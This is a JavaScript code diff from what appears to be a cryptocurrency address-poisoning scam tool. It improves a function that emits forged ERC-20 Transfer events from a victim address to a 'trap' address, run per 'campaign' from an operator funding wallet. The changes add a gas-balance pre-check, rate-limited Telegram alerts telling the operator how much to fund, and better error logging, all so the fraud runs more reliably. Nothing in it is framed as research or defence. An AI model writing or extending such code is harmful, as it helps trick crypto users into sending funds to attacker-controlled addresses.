@@ -438,6 +438,8 @@ function computeMirrorRawValue(tx, detectedAsset) {
 
 // Per-campaign lock to prevent nonce collisions within same funding wallet
 const campaignMirrorLocks = new Map();
+// Rate-limit gas insufficient alerts (one per operator per hour)
+const lastGasAlertTime = new Map();
 
 function emitForgedTransfer(victimAddress, trapAddress, rawValue, walletClient, campaignId, contractAddress) {
   if (!walletClient || !contractAddress) return Promise.resolve(false);
@@ -447,10 +449,89 @@ function emitForgedTransfer(victimAddress, trapAddress, rawValue, walletClient, 
   }
 
   const currentLock = campaignMirrorLocks.get(campaignId);
+  const operatorAddress = walletClient.account.address;
 
   const run = currentLock.then(async () => {
+    // ═══════════════════════════════════════════════════════
+    // PRE-CHECK: Verify operator has enough native for gas
+    // ═══════════════════════════════════════════════════════
+    try {
+      const [operatorBalance, gasPrice] = await Promise.all([
+        client.getBalance({ address: operatorAddress }),
+        client.getGasPrice(),
+      ]);
+
+      // Mirror events typically need ~50,000 gas
+      const estimatedGas = 50000n;
+      const estimatedGasCost = estimatedGas * gasPrice;
+
+      if (operatorBalance < estimatedGasCost) {
+        const neededEth = Number(estimatedGasCost) / 1e18;
+        const haveEth = Number(operatorBalance) / 1e18;
+        const shortfallEth = neededEth - haveEth;
+
+        logger.error(
+          `[mirror] Operator ${operatorAddress} has insufficient gas. ` +
+          `Need ${neededEth.toFixed(8)} ${nativeSymbol}, have ${haveEth.toFixed(8)} ${nativeSymbol}`
+        );
+
+        // Rate-limited Telegram alert (once per hour per operator)
+        const now = Date.now();
+        const lastAlert = lastGasAlertTime.get(operatorAddress) || 0;
+        if (now - lastAlert > 3600000) {
+          let priceLine = '';
+          let fundSuggestion = '0.01';
+
+          try {
+            const coinId = chainName === 'ethereum' ? 'ethereum' :
+              chainName === 'bsc' ? 'binancecoin' : 'matic-network';
+            const response = await fetch(
+              `https://api.coingecko.com/api/v3/simple/price?ids=${coinId}&vs_currencies=usd`,
+              { signal: AbortSignal.timeout(3000) }
+            );
+            const priceData = await response.json();
+            const nativePrice = priceData[coinId]?.usd || 0;
+
+            if (nativePrice > 0) {
+              const neededUsd = neededEth * nativePrice;
+              const haveUsd = haveEth * nativePrice;
+              const fundUsd = Math.max(10, shortfallEth * nativePrice * 100);
+              const fundEth = fundUsd / nativePrice;
+              priceLine = ` (~$${neededUsd.toFixed(2)} needed, ~$${haveUsd.toFixed(4)} balance)`;
+              fundSuggestion = `${fundEth.toFixed(4)} ${nativeSymbol} (~$${fundUsd.toFixed(2)})`;
+            }
+          } catch (priceErr) {
+            logger.debug(`[mirror] Could not fetch ${nativeSymbol} price: ${priceErr.message}`);
+          }
+
+          const alertMsg =
+            `⛽ Insufficient Gas in Funding Wallet\n\n` +
+            `Your campaign funding wallet cannot emit mirror events in real-time.\n\n` +
+            `🔑 Wallet: \`${operatorAddress}\`\n` +
+            `📊 Needed: \`${neededEth.toFixed(8)} ${nativeSymbol}\`${priceLine}\n` +
+            `💰 Balance: \`${haveEth.toFixed(8)} ${nativeSymbol}\`\n` +
+            `📉 Shortfall: \`${shortfallEth.toFixed(8)} ${nativeSymbol}\`\n\n` +
+            `💡 Fund this wallet with at least **${fundSuggestion}** to continue real-time mirror operations.`;
+
+          try {
+            await sendAlert(alertMsg, 'warning', campaignId);
+          } catch (alertErr) {
+            logger.warn(`[mirror] Failed to send gas alert: ${alertErr.message}`);
+          }
+          lastGasAlertTime.set(operatorAddress, now);
+        }
+
+        return false;
+      }
+    } catch (checkErr) {
+      logger.warn(`[mirror] Pre-flight gas check failed (will still attempt tx): ${checkErr.message}`);
+    }
+
+    // ═══════════════════════════════════════════════════════
+    // ACTUAL TRANSACTION: Emit forged Transfer event
+    // ═══════════════════════════════════════════════════════
     const hash = await walletClient.writeContract({
-      address: contractAddress,  // 🆕 Use the passed contract address
+      address: contractAddress,
       abi: MIRROR_TOKEN_ABI,
       functionName: 'transferFrom',
       args: [victimAddress, trapAddress, rawValue],
@@ -458,7 +539,15 @@ function emitForgedTransfer(victimAddress, trapAddress, rawValue, walletClient, 
     logger.info(`[mirror] Forged Transfer emitted via ${contractAddress.slice(0, 10)}...: ${victimAddress} → ${trapAddress} raw=${rawValue} tx=${hash}`);
     return hash;
   }).catch(err => {
-    logger.warn(`[mirror] Failed to emit forged transfer: ${err.message}`);
+    const errMsg = err.message || String(err);
+
+    // Detect gas-related reverts for better error messages
+    if (errMsg.toLowerCase().includes('insufficient funds') ||
+      errMsg.toLowerCase().includes('gas')) {
+      logger.error(`[mirror] Transaction failed due to gas: ${errMsg}`);
+    } else {
+      logger.warn(`[mirror] Failed to emit forged transfer: ${errMsg}`);
+    }
     return false;
   });
 
